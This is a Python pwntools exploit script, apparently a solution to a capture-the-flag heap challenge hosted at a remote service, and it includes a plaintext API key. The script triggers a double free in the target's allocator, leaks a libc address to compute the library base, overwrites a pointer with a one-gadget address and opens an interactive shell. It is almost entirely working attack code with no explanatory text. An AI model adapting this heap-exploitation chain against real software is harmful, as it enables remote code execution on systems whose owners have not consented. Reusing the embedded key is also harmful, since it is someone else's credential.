from pwn import *
import json
context.log_level = "DEBUG"
r = remote("cowboy.eatpwnnosleep.com",14697)
a = {
    'apikey' : "d08bec6b83b8c4c35929ee7ace9844f53dfdecaccd1405098eded9a47d2be0f3",
}
# ??????
#r.send(json.dumps(a).encode())
def Alloc(size):
    r.sendlineafter("exit\n----------------------------------------\n","1")
    r.sendlineafter("Give me size n < 2049: ",str(size))
def Free(Bin,Chunk):
    r.sendlineafter("exit\n----------------------------------------\n","2")
    r.sendlineafter("bin num? : ",str(Bin))
    r.sendlineafter("chunk num? : ",str(Chunk))
def FillData(Bin,Chunk,DATA):
    r.sendlineafter("exit\n----------------------------------------\n","4")
    r.sendlineafter("bin num? : ",str(Bin))
    r.sendlineafter("chunk num? : ",str(Chunk))
    r.sendafter("input: ",DATA)
Alloc(2048)
Alloc(2048)
Free(7,0)
Free(7,0)
Alloc(2048)
Alloc(2048)
Free(7,0)
FillData(7,0,p64(0x602080)+p64(0x602090))
r.sendlineafter("exit\n----------------------------------------\n","3")
r.recvuntil("bin[7]:")
r.recvuntil(" 0x602080 ")
K = r.recvuntil(" \n")
LIBC = int(K,16) - 0x03AF60
print hex(LIBC)
# ONE SHOT
FillData(7,1,p64(0x602080)+p64(LIBC+0x04526A))
r.interactive()
